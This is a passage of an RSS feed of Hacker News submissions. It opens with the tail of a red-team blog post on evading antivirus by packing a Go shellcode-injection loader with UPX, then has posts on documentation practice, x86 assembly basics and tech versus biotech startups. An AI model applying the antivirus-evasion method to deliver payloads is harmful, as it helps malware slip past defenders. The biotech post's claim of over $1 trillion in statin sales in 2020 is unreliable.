signature for this is.</p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig7.png" alt="" width="950" height="273"></figure>
<p><em>Fig.7 – Uploading
the UPX compressed Go exe file to Virus Total. Only Cybereason and Cylance
detect the file as being malicious.</em></p>
<p>Only two antivirus engines are picking up that there is a
malicious payload in this file, and both of them don’t specify what exactly
about the upload is malicious, just that it IS malicious. The UPX compression
is likely what’s triggering the alert, as UPX compression can be used to
obfuscate malicious files.</p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig8.png" alt="" width="745" height="191"></figure>
<p><em>Fig.8 – UPX
compression in brute mode compresses the exe file 8 times.</em></p>
<p>And that’s it! In this blog post we detailed how we modified a great Go program from Github (resource listed below) that performed shellcode injection into one that efficiently evaded most antivirus programs.</p>
<p>The gist for this is available <a href="https://gist.github.com/JumpsecLabs/202f95f9cce1ff35f140a37de0e62f30">here</a> </p>
<p>Reference:</p>
<p><a href="https://github.com/brimstone/go-shellcode">https://github.com/brimstone/go-shellcode</a></p>
<p><a href="https://boyter.org/posts/trimming-golang-binary-fat/">https://boyter.org/posts/trimming-golang-binary-fat/</a></p>
<p><a href="https://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/">https://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/</a></p>
</div>
</article>

</section>
</div>

</div>
</div></div>]]>
            </description>
            <link>https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262651</guid>
            <pubDate>Mon, 24 Aug 2020 17:01:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where should you put the documentation?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262638">thread link</a>) | @nicoespeon
<br/>
August 24, 2020 | https://understandlegacycode.com/blog/where-to-put-documentation/ | <a href="https://web.archive.org/web/*/https://understandlegacycode.com/blog/where-to-put-documentation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>“Of course, there is never any documentation…”</p></blockquote><p>This is the typical experience of a Legacy codebase.</p><p>Sure, documentation is not fun to write. It often feels like a waste of precious time, because <em>we know</em>. The problem is: we forget.</p><p>Documentation is <strong>never</strong> a priority for your project stakeholders. There are features to ship and bugs to fix! And then, one day, the lead developer who was working on the project for the last 5 years announces she’s leaving in 2 months. You now have 60 days to learn how to live and work without her.</p><p>So you start thinking about documenting everything she knows, all of the implicit knowledge. And very quickly comes up the question:</p><blockquote><p>“Where should we put the documentation?”</p></blockquote><p>Should it be specific to the team? Should it live in the company’s Confluence? Should you use the wiki that comes along GitHub/Gitlab? Are there tips that can help you? Traps you should avoid?</p><p>Let’s pause a moment here to think about what makes <strong>great</strong> documentation.</p><h2 id="the-3-traits-of-great-documentation"><a href="#the-3-traits-of-great-documentation" aria-label="the 3 traits of great documentation permalink"></a>The 3 traits of great documentation</h2><h3 id="1-easy-to-find"><a href="#1-easy-to-find" aria-label="1 easy to find permalink"></a>1. Easy to find</h3><p>If knowledge is spread across wikis, google docs, emails, and Jira tickets, people will have a hard time finding the information they need.</p><p>How do you know if documentation is easy to find? Well, there’s a typical symptom when it’s not: people frequently ask questions about things your team knows. Often, questions are the same. Because it’s not clear where they can find the information <em>by themselves</em>. Hunting for the answer will take longer (and more efforts) than raising the question and wait. That’s a waste of time. Good documentation would fix that!</p><p>When it’s clear where the documentation is, and it’s easy to search for specific information, you see less of that.</p><p><strong>Aim for having your documentation in a single place</strong>. A powerful search feature is a must.</p><h3 id="2-easy-to-read"><a href="#2-easy-to-read" aria-label="2 easy to read permalink"></a>2. Easy to read</h3><p>Basic formatting matters (and is usually given by most tools).</p><p>But think about images, diagrams, and code. Are they easy to read? Is there a way to make some information stand out? Is there a way to hide details that would not be relevant for all readers?</p><p>Adding information is simple. Keeping it relevant takes practice. Going to the point is a hard skill to earn, but it definitely worth it. Remove from your documentation what turns out to be unnecessary.</p><p><strong>Keep information short, easy to skim. Make people practice writing docs.</strong></p><p>Speaking of writing…</p><h3 id="3-easy-to-write"><a href="#3-easy-to-write" aria-label="3 easy to write permalink"></a>3. Easy to write</h3><p>This is usually overlooked, especially when it gets spoiled by heavy validation processes.</p><p>Let me be clear on this one:</p><blockquote><p>The more friction you add to the process of updating the doc, the less updated it will be.</p></blockquote><p>Out-of-date documentation is untrustworthy, making people fall back to asking others instead of trusting it. Out-of-date information should be updated or deleted.</p><p><undefined>
  <a href="https://understandlegacycode.com/static/f3beaf2a9b8e8ea55f5c0036eb111da0/a2176/up-to-date-documentation.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="up to date documentation" title="" src="https://understandlegacycode.com/static/f3beaf2a9b8e8ea55f5c0036eb111da0/a2176/up-to-date-documentation.jpg" srcset="https://understandlegacycode.com/static/f3beaf2a9b8e8ea55f5c0036eb111da0/7237a/up-to-date-documentation.jpg 148w,https://understandlegacycode.com/static/f3beaf2a9b8e8ea55f5c0036eb111da0/0cfdf/up-to-date-documentation.jpg 295w,https://understandlegacycode.com/static/f3beaf2a9b8e8ea55f5c0036eb111da0/a2176/up-to-date-documentation.jpg 586w" sizes="(max-width: 586px) 100vw, 586px">
    </span>
  </span>
  
  </a>
    </undefined></p><p>Get rid of useless information. Add missing ones. Make newcomers update the onboarding documentation. Take questions as chances to clarify the doc!</p><p>If updating the doc is frictionless, you’ll save your team a loooot of time.</p><p>You don’t need a validation stamp from the Tech Lead to update the doc. Anyone should feel entitled to do it.</p><p>2 things can help here:</p><ol><li>Change history will make you stop being afraid of losing information by someone accidentally removing it.</li><li>Frequent backups, in case something goes wrong</li></ol><p><strong>Trust people in doing their job. Let them update the doc as if it was a living document.</strong></p><h2 id="ok-but-where-to-put-the-documentation"><a href="#ok-but-where-to-put-the-documentation" aria-label="ok but where to put the documentation permalink"></a>OK, but WHERE to put the documentation?</h2><p>Following these 3 traits, I’d recommend keeping your documentation in 2 places:</p><ol><li><strong>Everything that is codebase specific should be versioned along with the source code</strong>. Instructions to help people work with the codebase should be here, in some README. I recommend you to <a href="https://understandlegacycode.com/blog/earn-maintainers-esteem-with-adrs">document your architectural decisions here, with ADRs</a>.</li><li><strong>Everything else should be in a single place</strong>. The exact solution doesn’t matter. What matters is that it’s consistent.</li></ol><p>That is, if your company uses Confluence, then use Confluence. If there’s no company standard on this, then make a decision for your team. Make it clear that all the documentation would be here.</p><h3 id="what-would-be-the-best-solution-for-documentation"><a href="#what-would-be-the-best-solution-for-documentation" aria-label="what would be the best solution for documentation permalink"></a>What would be the best solution for documentation?</h3><p>If you don’t have a place to put your documentation yet, or if you’ve decided to migrate from your existing solution, you should be looking for something that makes documentation:</p><ul><li>easy to find</li><li>easy to read</li><li>easy to write</li></ul><p>As of 2020, I recommend going for <a href="https://www.notion.so/">Notion</a>. It ranks best in most of the characteristics that matter for building handy documentation, especially if you’re working in software.</p><p>Listing all reasons why Notion is my preferred choice would fill another blog post. But in short:</p><ul><li>their search feature is powerful enough to make it easy to find information</li><li>they handle formatting, embedding images, code syntax highlighting, calling out important bits, and hiding less relevant ones</li><li>the content is editable in place, making it a breeze to write</li><li>anything can be turned into anything else, so you can just dump what’s in your head and then turn it into a more sophisticated page later</li><li>comments and assignments make it great for collaborating</li><li>they backup your content with change history, so you can go back in time if some information was deleted</li></ul><p>If you’re curious, have a look <a href="https://www.notion.so/Showcase-of-useful-Notion-features-d344bc6bf3c64eb88522cd746a206077">at my showcase of useful Notion features</a> for building company documentation.</p><p><a href="https://www.notion.so/Showcase-of-useful-Notion-features-d344bc6bf3c64eb88522cd746a206077"><undefined>
  <span>
    <span>
      <img alt="notion showcase" title="" src="https://understandlegacycode.com/static/dcc6f121d4cc14730a89b68b375b57bb/799d3/notion-showcase.png" srcset="https://understandlegacycode.com/static/dcc6f121d4cc14730a89b68b375b57bb/00d96/notion-showcase.png 148w,https://understandlegacycode.com/static/dcc6f121d4cc14730a89b68b375b57bb/0b23c/notion-showcase.png 295w,https://understandlegacycode.com/static/dcc6f121d4cc14730a89b68b375b57bb/799d3/notion-showcase.png 590w,https://understandlegacycode.com/static/dcc6f121d4cc14730a89b68b375b57bb/11d19/notion-showcase.png 800w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  </undefined></a></p><p>Regardless of the solution you choose, don’t get caught with perfectionism. Done is better than perfect. As long as you start putting useful knowledge in a single place that anyone can update, you’re doing great!</p></div></div>]]>
            </description>
            <link>https://understandlegacycode.com/blog/where-to-put-documentation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262638</guid>
            <pubDate>Mon, 24 Aug 2020 17:00:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing local files using Safari Web Share API]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262631">thread link</a>) | @aburan28
<br/>
August 24, 2020 | https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html | <a href="https://web.archive.org/web/*/https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262631</guid>
            <pubDate>Mon, 24 Aug 2020 16:59:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn assembly language – covering the basics]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262619">thread link</a>) | @supro
<br/>
August 24, 2020 | https://www.techteaching.co.uk/posts/learning-assembly-language-a-helpful-guide-part-1 | <a href="https://web.archive.org/web/*/https://www.techteaching.co.uk/posts/learning-assembly-language-a-helpful-guide-part-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><h3>What is Assembly?</h3><p>Assembly language is a programming language just like any other. Well nearly... every line in assembly language actually represents a single CPU&nbsp;instruction. This is different from a language like <strong>Python </strong>where a single line of code could represent hundreds of CPU&nbsp;instructions. </p><p>As a result of this, we have a lot more control over what we can do, but, it is a lot more complicated and time-consuming to create and debug programs. </p><h3>Why Learn Assembly?</h3><p>So if assembly is so much more complicated and time-consuming, you are probably thinking "what is the point?".</p><p>Well, by being able to understand assembly, you get an understanding for how your CPU&nbsp;behaves, allowing you to understand all programs you write/inspect to a much deeper level than those who don't have this skill. It will teach you more about memory management and the inner workings of what you are asking of the CPU&nbsp;when you make certain function calls, allowing you to improve you coding across all forms of programming exponentially. </p><p>Moreover, it allows the ability to reverse engineer executables. If you compile a program, it goes from a human-readable form, into a form that is some mutation of assembly language - this means you can work backwards from a compiled and packed program, to find any possible hidden, unknown vulnerabilities, secret extra features, or just get a much more knowledgeable understanding. </p><p>And of course, if you have a niche, specific requirement to interact with low-level hardware or system internals, there is no more reliable method than assembly. It may be harder, but you have complete understanding of what your instructions are doing, being able to interact in ways that are exclusive to that only of assembly language.</p><h2>Getting Started</h2><p>To start with we will focus on x86 - the Intel specific assembly format. This flavour of assembly is used in the majority of desktop and laptop computers, being support by intel and AMDs main CPUs. </p><p>For x86, the format of all assembly instructions is roughly as follows:</p><figure id="w-node-9a0c12a2a9f1-e258ac61"><p><img src="https://uploads-ssl.webflow.com/5f107c14834e28e988cdbcd1/5f3aa3027423af2287c63853_instruction_layout.png" alt=""></p></figure><p>The main 3 parts are the Mnemonic, Source and Destination. </p><p>The Mnemonic is simply the type of instruction that is being executed on that line. In our example here, we are using the <strong>MOV </strong>mnemonic, this means we are moving some value from the source into the destination. </p><p>The Source is where our data is originating from, whether it is a constant, or some variable. Think of this as the data on the right of an equals sign, so here it would be EAX =<strong> 8</strong>.</p><p>The Destination is where our result will be stored. As stated before, it can be thought of as the left side of an equation (left of the '='). In this case, it is <strong>EAX</strong>, this is a register, something we will come to later in the course, you can just think of it as a variable for now.</p><p>So all in all, the instruction above is moving the constant 8 into our "variable" EAX. That wasn't too bad, you just read your first bit of assembly!</p><h3>What Are Registers?</h3><p>As we mentioned before, and will be continuing to mention a lot, assembly uses something called registers. These are just fast local storage locations. They are easily accessible within the CPU, therefore it doesn't need to access any external memory, saving a lot of time. On the downside, the CPU only contains a few registers, and these registers can only hold a very small amount of data. In x86 the registers are only 32 bits in size. This means they can hold 4 bytes of data, or as little as 4 characters! </p><figure id="w-node-9224bdcf45ad-e258ac61"><p><img src="https://uploads-ssl.webflow.com/5f107c14834e28e988cdbcd1/5f3aa8ffadd61127fcd2273a_s.png" alt=""></p></figure><p>As you can see, we have a very clear data hierarchy that shows that in our computer we have a range of memory, from small and fast like registers, to large and slow like the HDD. </p><p>So how many registers does x86 have? In total there are 9 key registers:</p><p>EAX, EBX, ECX, EDX, EBP, ESP, EIP, ESI, EDI.</p><p>The reason for the naming convention is due to the fact that originally most registers had a specific purpose, for example, the <strong>ECX </strong>register was used exclusively for counting, so would typically be used as the counter when performing a loop. EAX,&nbsp;EBX, ECX and EDX are now thought of as general registers, they can be used for any general-purpose need. The other registers are still role-specific, however, we will come onto these later.</p><h3>Register Breakdown</h3><p>When dealing with registers, we don't have to reference it as a whole, the register can be broken down into smaller subsections for interacting with. This means that we can perform easier bit manipulations, and enables greater precision with potential for greater optimisation. When we reference a general register, we can pass a 4 byte value in, such as 0x12345678. To do this we can write the instruction mov EAX, 0x12345678. In this case, it is including all 4 bytes with the EAX reference. We can, however, break it down as shown:</p><figure id="w-node-f8e9f24c6f71-e258ac61"><p><img src="https://uploads-ssl.webflow.com/5f107c14834e28e988cdbcd1/5f3ab20f0dc3b2f8f71f83d8_Register_breakdown.png" alt=""></p></figure><p>As you can see from the diagram above, we can reference the whole value 0x12345678 with the name <strong>EAX</strong>. But if we want to just get the value of the third byte (0x56) we can use <strong>AH </strong>to retrieve it. <strong>AX </strong>would return 0x5678 and <strong>AL </strong>gives 0x78. All general registers (EAX,&nbsp;EBX, ECX, EDX) are broken down in the same way, with BX, CX, DX, etc... </p><p>ESI, EDI, EBP, ESP can all be broken down, but only in a similar way as shown:</p><figure id="w-node-0e752026ef9e-e258ac61"><p><img src="https://uploads-ssl.webflow.com/5f107c14834e28e988cdbcd1/5f3ab4a8242a483e3d91cb58_reg_esi.png" alt=""></p></figure><p>For example, &nbsp;EDI -&gt;&nbsp;DI, &nbsp;EBP -&gt;&nbsp;BP,&nbsp; ESP -&gt;&nbsp;SP.</p><h3>Getting started with Fundamental Instructions</h3><p>Now we have an understanding of what registers are, and the way assembly instructions are laid out, we can begin to recognise some of the most frequent instructions.</p><h4>Arithmetic instructions</h4><figure id="w-node-d12606e860cd-e258ac61"><p><img src="https://uploads-ssl.webflow.com/5f107c14834e28e988cdbcd1/5f3b01b6d6e62bb282cafa0c_simple%20instructions.png" alt=""></p></figure><p>As you can see from these instructions, we can see how we can decipher to operation from the mnemonic. Then we store the result of the action on the source in the destination. There is also a new instruction format where there is only a destination - e.g. inc x. This is called a "unary operation" as it only uses one parameter. The reason it has no source is that the instruction has a fixed operation, it will always just add 1 to the register provided, there is, therefore, no need to pass in any other parameters.</p><p>Breaking down the cases above, we can replace X and Y in several different ways. There are 4 ways in particular that we can address the values X and Y.</p><h4>Direct</h4><p>This is when we pass an <strong>immediate </strong>value into a register / memory region.</p><p>E.g. &nbsp;&nbsp;<strong>mov eax , 0x12345678</strong></p><h4>Indirect</h4><p>Moving some contents that is within memory into a register / another memory region.</p><p>E.g. &nbsp;&nbsp;<strong>mov eax , [0x12345678]</strong></p><h4>Direct Register</h4><p>Similar to the "direct", this moves a value from one register to another.</p><p>E.g. &nbsp;&nbsp;<strong>mov eax , ebx</strong></p><h4>Indirect Register</h4><p>Take the contents of memory, pointed to by one register, and move it into another register / memory region.</p><p>E.g. &nbsp;&nbsp;<strong>mov eax , [ebx]</strong></p><h3>Pointers Explained</h3><p>When we put square brackets - <strong>[ ] </strong>- around an immediate value or register, what does this mean?&nbsp;This is the programming equivalent of defining it as a pointer. If you aren't familiar with pointers they are explained below:</p><p>When we write - <strong>mov EAX, [EBX]</strong> - it is the programming equivalent of - <strong>EAX = *EBX </strong></p><p>This <strong>* </strong>is an operator that helps us get the data that the pointer is directing us towards. So how does this work? Say we have a variable 'X', if we assign Y = X, we take whatever value is inside the variable 'X', and put it straight into 'Y'. However, if we take variable 'X' as a pointer, we can instead say Y&nbsp;= *X. if this is the case, we treat the value stored in X as an address to get a value from. Take the diagram below:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f107c14834e28e988cdbcd1/5f3b0e2f3c21a441440adc19_pointers.png" alt=""></p></figure><p>As we can see, X = 0xABCD1234. If we use Y =&nbsp;*X as we talked about, it takes 0xABCD1234, and looks into memory to see what is stored at this address. As you can see from the diagram, it would be 0xDEADBEEF. Therefore the result of Y = *X would be Y = 0xDEADBEEF. This will become more apparent as we work with more hands-on examples in later guides. </p><h3><a href="https://www.techteaching.co.uk/posts/learning-assembly-language-a-helpful-guide-part-2">[Part 2]undefined</a></h3><p>Now we understand pointers, assembly format, and some simple instructions, we can begin to read/write some actual programs. </p></div></div></div></div>]]>
            </description>
            <link>https://www.techteaching.co.uk/posts/learning-assembly-language-a-helpful-guide-part-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262619</guid>
            <pubDate>Mon, 24 Aug 2020 16:59:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Rough Font Awesome Icons]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262520">thread link</a>) | @scriptjava
<br/>
August 24, 2020 | https://djamshed.github.io/rough-awesome-font/dist/ | <a href="https://web.archive.org/web/*/https://djamshed.github.io/rough-awesome-font/dist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://djamshed.github.io/rough-awesome-font/dist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262520</guid>
            <pubDate>Mon, 24 Aug 2020 16:50:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Applying tech frameworks to biotech: key differences]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24262336">thread link</a>) | @apsec112
<br/>
August 24, 2020 | https://www.celinehh.com/tech-vs-biotech | <a href="https://web.archive.org/web/*/https://www.celinehh.com/tech-vs-biotech">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-yui_3_17_2_1_1590947194898_9413"><div><p>Many of the common startup frameworks for tech companies do not apply as well to biotech. I’ve gone through the most common frameworks below, and how they differ for biotech companies. </p><p>I’m defining a tech startup here as a company whose product is largely based off of code. I am not including in my arbitrary categorization ‘deep tech’ (e.g., autonomous trucks, satellite startups, etc), which often face similar challenges as biotech companies. </p><p>Biotech here is a startup developing a drug. </p><p><em>These are generalizations, and many exceptions exist. </em></p><h2><strong>Risks and Finding Product Market Fit</strong></h2><p><span><strong>TECH</strong></span><strong>: Significant market and execution risks<br></strong><span><strong>BIOTECH</strong></span><strong>: Minimal market risk, a lot of technical risk</strong></p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_605840"><div><p>In tech, the company often uses a standard software stack and applies it in a novel way (a new product). The question is usually not ‘can this thing be built’, but ‘does anyone want this thing we made’?</p><p>In biotech, this is flipped. The market (a disease) is well established, but the ability to develop a product (a drug) that addresses this market is the core risk. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_607921"><p><span><strong>TECH</strong></span><strong>: Rolling derisking, early signs of product-market fit<br></strong><span><strong>BIOTECH</strong></span><strong>: Derisking comes in bursts over years (biological milestones), early signals less reliable</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_617219"><div><p>In tech, you want the ‘up and to the right’ chart, showing exponential increase of some core metric of the company. Adoption, revenue, and other metrics derisk the company and give early signs of PMF. Early signs can be highly predictive of the company’s eventual success.</p><p>In biotech, derisking the company is predominantly tied to specific biological milestones. These come in bursts, with long periods of waiting in-between. Additionally, early milestones (such as the drug working in mice) aren’t 1-to-1 predictive of eventual success (the drug working in people).</p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_619233"><p><span><strong>TECH</strong></span><strong>: Iterate to product-market-fit<br></strong><span><strong>BIOTECH</strong></span><strong>: Product (drug) finalized years before on market</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_631626"><div><p>In tech, the product is constant iterates and improves from customer feedback to find the exact product that people want. </p><p>In biotech, due to the extensive regulation, the final product (the drug) is finalized years before it first goes into people. If the drug doesn’t work in people, there is no iterating. If you want to modify the product, you need to restart the entire process over again. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_633705"><div><h2><strong>Founders &amp; Market</strong></h2><p><span><strong>TECH</strong></span><strong>: Founders often bring insight around a market<br></strong><span><strong>BIOTECH</strong></span><strong>: Founders often bring insight around key biology</strong></p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_651094"><div><p>In tech, a prototypical founder often worked at the incumbent company or realized a market opportunity by being that market themself. The insight around the market opportunity itself is a core value of the company. </p><p>In biotech, the insight of the founder is around a new or better way to develop a drug for the disease, or a discovery that was made in the laboratory (and the relevant patents around it). </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_665620"><p><span><strong>TECH</strong></span><strong>: Founders often younger, ‘youth wunderkinds’ widely accepted <br></strong><span><strong>BIOTECH</strong></span><strong>: Founders often older due to scientific training or are a professional CEO, rarer to have very young founders </strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_678110"><div><p>In tech, the 18-year-old drop-out is lauded and mystified. If anything, older founders may be subconsciously discriminated against in favor for younger founders. </p><p>In biotech, the prototypical founder is older, often a career CEO or exec coming out of a Big Pharma company. At minimum, the founders almost always have significant scientific training - a PhD can take 6-8 years, and post-docs 2-3 years each. It is less common to see founders in their 20s and you almost never see ‘youth wunderkinds’. This is in part due to the conservatism of the industry and in part because extensive scientific training is generally necessary to have enough biological insight to correctly identify an opportunity. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_420694"><p><span><strong>TECH</strong></span><strong>: Can create a new market<br></strong><span><strong>BIOTECH</strong></span><strong>: Markets are diseases and therefore public domain</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_422265"><div><p>In tech, some of the most successful companies created or defined their market - a classic example being ride sharing. Once a new market is validated, other companies/copycats/fast-followers flow in. </p><p>In biotech, the market opportunities are diseases. New markets can somewhat be created (e.g., nootropics, elective medicines, Viagra) but generally speaking the markets are well known. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_423860"><p><span><strong>TECH</strong></span><strong>: Markets are winner-take-all<br></strong><span><strong>BIOTECH</strong></span><strong>: Many winners</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_458802"><div><p>In tech, investors often bet on a specific horse with the hope that the horse will win the race (and all the earnings). Bifurcated markets can be especially dangerous as companies compete on pricing and ‘race to the bottom’.</p><p>In biotech, the markets are <em>so </em>large, and the unmet need so high, that there can and often are many winners in one market (disease). The classic example here are statins, which in 2020 had over $1 trillion in sales across seven market approved statins, with the best-selling Lipitor having peak sales of $12B in the mid-2000s. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_456236"><div><h2><strong>Product Strategy</strong></h2><p><span><strong>TECH</strong></span><strong>: Often develop one product at a time, focus is key <br></strong><span><strong>BIOTECH</strong></span><strong>: Portfolio approach is encouraged to de-risk company, exception is one-asset, repurposing plays</strong></p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_482826"><div><p>Focus is crucial for any startup. However, in biotech the most successful and valuable companies often take a portfolio approach to product development - developing multiple products simultaneously. In tech, companies generally focus around one product or core offering, only differentiating once they have earned the right to do so by finding PMF with their first product.</p><p>A significant reason for this is to derisk the company against biological randomness. Instead, focus in a biotech company is usually around a core competency - e.g., a method of discovering drugs, or a way of delivering the drug - and then diversified within this core competency. For example, gene therapy company Spark Therapeutics had a core competency of AAV-based gene therapy (a virus loaded with DNA to treat a genetic disease) but leverages this competency simultaneously across multiple diseases. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_484564"><p><strong>﻿</strong><span><strong>TECH</strong></span><strong>: Outsourcing product development or engineering unadvisable<br></strong><span><strong>BIOTECH</strong></span><strong>: Common to use contractors for key experimental work</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_497310"><div><p>In tech, not having someone technical on the founding team is a classic ‘no no’. You generally should have the ability to build (and therefore rapidly iterate on and improve) your core product within the team. </p><p>In biotech, it is common and often preferred to use contract research organizations (CROs) for much of your experimental work. Some experiments can only be done by specialized CROs, and they often have advantages from scale that a startup cannot hope to replicate. Building and staffing a laboratory, including the multiple six-figure machines necessary, is impracticable and unnecessary for most companies. </p><p>Virtual biotechs - companies with distributed leadership and all research outsourced to CROs - have been popular long before it became the tech zeitgeist.</p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_499137"><p><span><strong>TECH</strong></span><strong>: Fast-followers and copycats a significant risk<br></strong><span><strong>BIOTECH</strong></span><strong>: Strong patent protection </strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_570610"><div><p>In tech, being the first/best product to a new market is so important because once you validate a market’s need for a specific product, it is easy for others to copy and chip at your market share. This is especially common in traditional D2C brands, for example the many bed-in-a-box companies. </p><p>In biotech, patents are king. If you hold the key patent it is impossible for your drug to be copied. Once patents expire, however, there is a whole industry (generics) around copying drugs and selling them cheaper than the branded product. Because of the hundreds of millions it takes to develop a drug, it is almost impossible to commercialize a drug that is not able to be protected by patents, regardless of its efficacy. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_568710"><div><h2><strong>Raising, Spending, and Making Money</strong></h2><p><span><strong>TECH</strong></span><strong>: Primary burn usually people costs <br></strong><span><strong>BIOTECH</strong></span><strong>: Primary burn R&amp;D</strong></p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_725052"><p>Biotech companies’ biggest line item is undoubtedly R&amp;D spend - funding to do research experiments necessary to find and develop their drug. This is despite the average salary in biotech also often being higher than tech’s.</p></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_722809"><p><span><strong>TECH</strong></span><strong>: Series Seed and A smaller, with larger subsequent rounds to scale and win market share<br></strong><span><strong>BIOTECH</strong></span><strong>: Capital needs front-loaded, Seeds can be the size of tech Series A’s</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_745080"><div><p>In tech, you can often show proof-of-concept or even begin selling your product with a small team and pre-seed capital. </p><p>Biotech Seeds can often look like tech Series As in magnitude. On the East Coast, the first rounds in biotech companies are more than often in the $10s of millions. This is because of the millions needed to hit biological milestones to push the company forward (and therefore qualify for the next stage of financing).</p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_742704"><p><span><strong>TECH</strong></span><strong>: Often command higher valuations early on <br></strong><span><strong>BIOTECH</strong></span><strong>: Often command lower valuations early on</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_803591"><div><p>Tech valuations usually optimize for selling 10% - 25% of the company in any one financing. </p><p>In biotech, valuations are historically significantly lower, with many East Coast deals selling 50%+ of the company in one financing. Such huge dilution is less common in West Coast biotech financings, but it is more common sell 33%+ of the company in one financing. Biotech founders also often have less negotiating power here because they have to raise large amounts to bring the company to the next stage. </p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_805993"><p><span><strong>TECH</strong></span><strong>: Business usually has significant revenue at exit <br></strong><span><strong>BIOTECH</strong></span><strong>: Unlikely to have revenue at exit</strong></p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_845025"><div><p>While the company may be far from profitable, tech companies almost always have significant revenue at exit (IPO or acquisition). </p><p>In biotech, companies almost never have revenue at exit. Instead, the value of the company is driven by the increasing probability that their drug will work (and therefore decreasing biological risk). The company is often sold or partnered years before the drug is commercialized.</p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_836878"><div><h2><strong>Team</strong></h2><p><span><strong>TECH</strong></span><strong>: Core team often younger, primed to take more equity over salary<br></strong><span><strong>BIOTECH</strong></span><strong>: Core team often older due to extensive scientific training, often more risk-adverse or otherwise unable to sacrifice heavily on salary </strong></p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1594517769210_824365"><div><p>In tech, there is a self-selecting group that aspire to work in or on a startup, and are primed to take the high equity with lower salary in the hope that they pick the company that will become a unicorn and make them rich, too. They are often younger …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.celinehh.com/tech-vs-biotech">https://www.celinehh.com/tech-vs-biotech</a></em></p>]]>
            </description>
            <link>https://www.celinehh.com/tech-vs-biotech</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262336</guid>
            <pubDate>Mon, 24 Aug 2020 16:37:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I helped fix Canadaʼs Covid Alert app]]>
            </title>
            <description>
<![CDATA[
Score 247 | Comments 45 (<a href="https://news.ycombinator.com/item?id=24262236">thread link</a>) | @todsacerdoti
<br/>
